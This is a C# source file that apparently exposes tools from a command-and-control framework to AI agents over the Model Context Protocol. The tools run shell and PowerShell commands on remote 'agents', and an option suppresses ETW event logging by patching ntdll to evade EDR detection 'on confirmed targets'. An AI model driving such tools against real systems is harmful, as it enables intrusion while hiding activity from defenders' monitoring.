using System.ComponentModel;
using ModelContextProtocol.Server;
using LibraNextgen.Common.Models;
using LibraNextgen.Service.Services;
using Microsoft.AspNetCore.Http;

namespace LibraNextgen.Service.Mcp;

[McpServerToolType]
public sealed class ShellTools
{
    [McpServerTool, Description("Execute a shell command on an agent and wait for the result")]
    public static async Task<string> execute_shell(
        IHttpContextAccessor http,
        TaskService taskService,
        AgentService agents,
        [Description("Target agent ID")] string agentId,
        [Description("Shell command to execute")] string command,
        [Description("Timeout in seconds (default 30)")] int timeoutSeconds = 30,
        CancellationToken ct = default)
    {
        return await McpUtils.CreateTaskAndWait(
            taskService, agents, McpUtils.GetCaller(http),
            agentId, CommandType.Shell, command, timeoutSeconds, null, ct);
    }

    [McpServerTool, Description("Execute a PowerShell command on an agent and wait for the result")]
    public static async Task<string> execute_powershell(
        IHttpContextAccessor http,
        TaskService taskService,
        AgentService agents,
        [Description("Target agent ID")] string agentId,
        [Description("PowerShell command or script")] string command,
        [Description("Timeout in seconds (default 30)")] int timeoutSeconds = 30,
        [Description("Suppress PowerShell ETW event logs during execution (default false; rewrites ntdll ETW exports in the agent process — EDR behavior-detection risk, only enable on confirmed targets)")] bool etwSuppress = false,
        CancellationToken ct = default)
    {
        var arguments = new List<string>();
        if (etwSuppress) arguments.Add("etwSuppress=true");
        return await McpUtils.CreateTaskAndWait(
            taskService, agents, McpUtils.GetCaller(http),
            agentId, CommandType.PowerShell, command, timeoutSeconds, arguments, ct);
    }
}
